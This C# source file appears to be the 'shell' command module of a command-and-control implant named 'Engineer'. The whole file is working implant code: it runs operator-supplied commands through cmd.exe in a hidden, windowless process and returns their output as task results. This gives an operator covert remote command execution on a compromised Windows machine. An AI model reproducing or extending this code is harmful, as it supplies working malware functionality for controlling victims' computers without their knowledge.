using Engineer.Commands;
using Engineer.Functions;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Engineer.Commands
{
    internal class Shell : EngineerCommand
    {
        public override string Name => "shell";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                task.Arguments.TryGetValue("/command", out string command);
                if (command == null)
                {
                    Tasking.FillTaskResults("No command specified", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                command = command.TrimStart(' ');

                var output = new StringBuilder();

                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        WorkingDirectory = Directory.GetCurrentDirectory(),
                        FileName = "cmd.exe",
                        Arguments = $"/c {command}",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true
                    }
                };

                process.OutputDataReceived += (_, args) => { output.AppendLine(args.Data); };
                process.ErrorDataReceived += (_, args) => { output.AppendLine(args.Data); };

                process.Start();
                process.BeginOutputReadLine();
                process.BeginErrorReadLine();
                process.WaitForExit();

                process.Dispose();

                Tasking.FillTaskResults(output.ToString(), task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                Tasking.FillTaskResults("error: " + ex.Message, task, EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
